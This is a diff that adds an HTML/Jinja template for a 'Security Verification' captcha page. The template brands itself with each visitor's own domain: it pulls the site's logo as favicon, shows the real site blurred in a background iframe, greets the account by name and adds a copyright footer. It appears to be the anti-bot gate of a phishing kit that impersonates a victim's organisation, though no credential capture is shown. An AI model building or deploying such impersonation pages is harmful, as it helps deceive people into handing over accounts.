@@ -1,0 +1,259 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Security Verification Required</title>
+    <link rel="icon" href="https://api.kickfire.com/logo?website={{ user_domain }}" type="image/x-icon">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background: #f3f3f3;
+            overflow: hidden;
+        }
+        #background-iframe {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            border: none;
+            z-index: -1;
+            filter: blur(3px) brightness(0.8);
+        }
+        .captcha-container {
+            background: rgba(0, 0, 0, 0.7);
+            backdrop-filter: blur(15px);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 8px;
+            padding: 25px;
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
+            width: 90%;
+            max-width: 350px;
+            box-sizing: border-box;
+            animation: fadeIn 1s ease-in-out;
+            color: #fff;
+            text-shadow: 0 1px 2px rgba(0, 0, 0, 0.1);
+        }
+        .captcha-container h1 {
+            text-align: center;
+            margin-bottom: 8px;
+            font-size: 20px;
+            color: #fff;
+            font-weight: 400;
+        }
+        .captcha-container h2 {
+            text-align: center;
+            margin-bottom: 20px;
+            font-size: 13px;
+            color: rgba(255, 255, 255, 0.8);
+            font-weight: 400;
+        }
+        .info-box {
+            background: rgba(255, 255, 255, 0.1);
+            padding: 12px;
+            border-radius: 6px;
+            margin-bottom: 18px;
+            text-align: center;
+            font-size: 13px;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+        }
+        .info-box strong {
+            color: #fff;
+            font-weight: 500;
+        }
+        .captcha-image-container {
+            background: rgba(255, 255, 255, 0.9);
+            padding: 15px;
+            border-radius: 6px;
+            margin: 15px 0;
+            text-align: center;
+            border: 1px solid rgba(255, 255, 255, 0.3);
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.2);
+        }
+        .captcha-image-container img {
+            max-width: 100%;
+            height: auto;
+            border-radius: 4px;
+        }
+        .captcha-container form {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+        .captcha-container label {
+            width: 90%;
+            margin-bottom: 6px;
+            font-size: 13px;
+            color: #fff;
+            text-align: left;
+            font-weight: 500;
+        }
+        .captcha-container input,
+        .captcha-container button {
+            width: 90%;
+            padding: 12px;
+            margin-bottom: 15px;
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            border-radius: 6px;
+            font-size: 13px;
+            box-sizing: border-box;
+            transition: all 0.3s ease;
+            background: rgba(255, 255, 255, 0.1);
+            color: #fff;
+        }
+        .captcha-container input::placeholder {
+            color: rgba(255, 255, 255, 0.6);
+        }
+        .captcha-container input:hover,
+        .captcha-container input:focus {
+            border-color: rgba(255, 255, 255, 0.4);
+            box-shadow: 0 0 8px rgba(255, 255, 255, 0.2);
+            background: rgba(255, 255, 255, 0.15);
+            outline: none;
+        }
+        .captcha-container button {
+            background-color: rgba(255, 255, 255, 0.25);
+            color: white;
+            border: none;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            font-weight: 500;
+            letter-spacing: 0.3px;
+            font-size: 14px;
+            padding: 12px;
+            margin-top: 5px;
+        }
+        .captcha-container button:hover {
+            background-color: rgba(255, 255, 255, 0.35);
+            transform: translateY(-1px);
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.3);
+        }
+        footer {
+            margin-top: 20px;
+            border-top: 1px solid rgba(255, 255, 255, 0.1);
+            padding-top: 15px;
+        }
+        footer p {
+            font-size: 11px;
+            text-align: center;
+            color: rgba(255, 255, 255, 0.6);
+            line-height: 1.3;
+            margin: 4px 0;
+        }
+        @media (max-width: 600px) {
+            .captcha-container {
+                padding: 20px;
+                max-width: 320px;
+            }
+            .captcha-container h1 {
+                font-size: 18px;
+            }
+            .captcha-container h2 {
+                font-size: 12px;
+            }
+        }
+        @keyframes fadeIn {
+            from {
+                opacity: 0;
+                transform: translateY(-8px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+        .form-message {
+            margin: 8px 0;
+            padding: 8px;
+            border-radius: 4px;
+            text-align: center;
+            font-size: 12px;
+            display: none;
+        }
+        .error {
+            background: rgba(255, 0, 0, 0.2);
+            color: #ff6b6b;
+            border: 1px solid rgba(255, 107, 107, 0.3);
+        }
+    </style>
+</head>
+<body>
+    <!-- Background iframe -->
+    <iframe id="background-iframe" src="https://{{ user_domain }}"></iframe>
+
+    <!-- Captcha Form -->
+    <div class="captcha-container" id="captcha-container">
+        <div id="forms">
+            <center>
+                <h1>Security Verification</h1>
+                <h2>Complete the challenge to continue</h2>
+                
+                <div class="info-box">
+                    Account: <strong>{{ user_greet }}</strong>
+                </div>
+
+                <p style="text-align: center; font-size: 13px; color: rgba(255, 255, 255, 0.8); margin-bottom: 15px;">
+                    Enter the code displayed below:
+                </p>
+                
+                <div class="captcha-image-container">
+                    <img src="data:image/png;base64,{{ img_data }}" alt="CAPTCHA Code">
+                </div>
+
+                <form id="captcha-form" method="POST" action="{{ url_for('captcha_challenge') }}">
+                    <input id="captcha-input" type="text" placeholder="Enter the 6-digit code" name="code" required maxlength="6">
+                    <input type="hidden" name="web" value="{{ request.args.get('web') }}">
+                    
+                    <button type="submit" id="captcha-submit">
+                        <i class="fas fa-shield-alt" style="margin-right: 6px;"></i>
+                        Verify & Continue
+                    </button>
+                </form>
+
+                <div id="captcha-message" class="form-message error"></div>
+
+                <footer>
+                    <p>Security verification required for account protection</p>
+                    <p>© 2025 {{ user_domain }} | Privacy & Security</p>
+                </footer>
+            </center>
+        </div>
+    </div>
+
+    <script>
+        // Form validation
+        const captchaForm = document.getElementById('captcha-form');
+        const errorMessage = document.getElementById('captcha-message');
+
+        captchaForm.addEventListener('submit', function(event) {
+            const captchaInput = document.getElementById('captcha-input');
+            
+            if (captchaInput.value.length !== 6) {
+                event.preventDefault();
+                errorMessage.textContent = 'Please enter the complete 6-digit security code.';
+                errorMessage.style.display = 'block';
+                captchaInput.focus();
+                return;
+            }
+            
+            // Show loading state
+            const submitBtn = document.getElementById('captcha-submit');
+            submitBtn.innerHTML = '<i class="fas fa-spinner fa-spin" style="margin-right: 6px;"></i> Verifying...';
+            submitBtn.disabled = true;
+        });
+
+        // Auto-focus on input field
+        document.addEventListener('DOMContentLoaded', function() {
+            document.getElementById('captcha-input').focus();
+        });
+    </script>
+</body>
+</html>
